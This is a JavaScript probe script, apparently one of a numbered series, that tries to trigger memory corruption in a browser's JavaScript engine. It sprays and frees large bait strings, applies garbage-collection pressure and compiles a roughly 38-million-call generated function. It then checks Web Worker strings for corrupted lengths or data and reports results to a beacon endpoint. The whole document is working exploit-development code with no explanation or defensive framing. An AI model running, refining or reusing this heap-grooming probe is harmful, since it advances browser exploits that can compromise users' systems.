// p480 — FIXED string literal length (1000 chars exactly)
//
// V377/V378/V479 all FALSE POSITIVE: the 'A' literal was 817 chars, not 1000.
// 817 × 100 = 81700 = the "corrupted" .length. No actual corruption.
//
// This probe uses String.fromCharCode to build EXACTLY 1000-char chunks,
// guaranteeing .length = 100000 after construction.
// If the sweep actually corrupts strings, .length will differ from 100000.
//
// Beacon prefix: V480-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V480-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // Build a guaranteed 1000-char string
  var CHUNK_1000 = '';
  for (var ci = 0; ci < 1000; ci++) CHUNK_1000 += 'A';
  B('CHUNK-LEN', '' + CHUNK_1000.length); // should be 1000

  var workerCode = function() {
    var strings = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var wT0 = Date.now();

    function beacon(tag, body) {
      try {
        var dt = Date.now() - wT0;
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V480-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + dt + 'ms] ' + (body || ''));
      } catch(e) {}
    }

    // Build guaranteed 1000-char chunk in worker too
    var CHUNK = '';
    for (var ci = 0; ci < 1000; ci++) CHUNK += 'A';

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += CHUNK;
          }
          // s should be exactly 100000 chars now
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force resolution
          strings.push(s);
        }
        beacon('ALLOC-s' + strings.length + '-len' + strings[0].length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'scan') {
        var phase = e.data.phase;
        var hits = 0, lens = [];
        for (var i = 0; i < strings.length; i++) {
          try {
            var len = strings[i].length;
            if (len !== STR_LEN) {
              hits++;
              if (lens.length < 14) lens.push(i + ':' + len);
            }
          } catch(ex) {
            hits++;
            if (lens.length < 14) lens.push(i + ':ERR');
          }
        }
        // Also read charCodeAt to detect data pointer corruption
        var charChecks = [];
        for (var i = 0; i < Math.min(3, strings.length); i++) {
          try {
            var c0 = strings[i].charCodeAt(0);
            var c50k = strings[i].charCodeAt(50000);
            var cEnd = strings[i].charCodeAt(strings[i].length - 1);
            charChecks.push('s' + i + ':c0=' + c0.toString(16) + ',c50k=' + c50k.toString(16) + ',cEnd=' + cEnd.toString(16));
          } catch(ex) {
            charChecks.push('s' + i + ':CRASH');
          }
        }
        self.postMessage({
          type: 'scan-result', phase: phase,
          hits: hits, lens: lens, charChecks: charChecks
        });
        return;
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      phaseFreeBaits();
    } else if (e.data.type === 'scan-result') {
      reportResults(e.data);
    }
  };

  // Baits: 20 × 100,000 chars (CORRECT 1000-char chunks)
  var BAIT_CHUNK = '';
  for (var ci = 0; ci < 1000; ci++) BAIT_CHUNK += 'B';

  var N_BAIT = 20;
  var STR_LEN = 100000;
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += BAIT_CHUNK;
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAITS-' + N_BAIT + '-len' + baits[0].length);
  worker.postMessage({ cmd: 'alloc' });

  // Phase 2: Free baits + heavy GC
  function phaseFreeBaits() {
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    B('FREED');
    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-' + gcRound);
        phaseBuild();
      }
    }
    gcPressureRound();
  }

  // Phase 3: Compile (no call)
  function phaseBuild() {
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';
    var parts = ['window.__p480fn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p480ok=true;');
    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p480ok ? 'OK' : 'FAIL'));
      // Scan — no call needed (V478 showed compile-only works)
      worker.postMessage({ cmd: 'scan', phase: 'post-compile' });
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }

  function reportResults(r) {
    var p = r.phase;
    B(p + '-HITS', r.hits + '-of-14');
    if (r.lens.length > 0) B(p + '-LENS', r.lens.join('|'));
    for (var i = 0; i < r.charChecks.length; i++) {
      B(p + '-CHK' + i, r.charChecks[i]);
    }
    B('SUMMARY', 'hits=' + r.hits);
    if (r.hits === 0) B('NO-CORRUPTION', 'strings intact after compile');
    B('DONE');
  }
})();
